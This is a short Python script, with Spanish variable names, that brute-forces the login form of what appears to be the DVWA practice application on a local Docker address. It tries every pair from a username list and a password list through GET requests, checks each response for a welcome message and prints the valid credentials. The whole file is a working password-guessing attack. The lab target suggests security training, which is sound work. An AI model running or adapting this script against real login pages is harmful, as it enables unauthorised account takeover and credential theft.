#!/usr/bin/env python3
import requests

BASE_URL = "http://172.17.0.1:8081/vulnerabilities/brute/"
COOKIES = {
    "security": "low",
    "PHPSESSID": "cad4418c5efdbc430337137ea5f77655"
}


def load_list(filename):
    with open(filename, "r") as f:
        return [line.strip() for line in f if line.strip()]

def main():
    usuarios = load_list("users.txt")
    contras = load_list("pass.txt")
    for usuario in usuarios:
        for pwd in contras:
            params = {
                "username": usuario,
                "password": pwd,
                "Login": "Login"
            }
            cookies = COOKIES.copy()
            response = requests.get(BASE_URL, params=params, cookies=cookies)
            contenido = response.text
            patron_exito = (
                f'<p>Welcome to the password protected area {usuario}</p>'
            )
            if patron_exito in contenido:
                print(f"[+] Credenciales válidas: {usuario}:{pwd}")
            else:
                print(f"[-] Fallido: {usuario}:{pwd}")

if __name__ == "__main__":
    main()

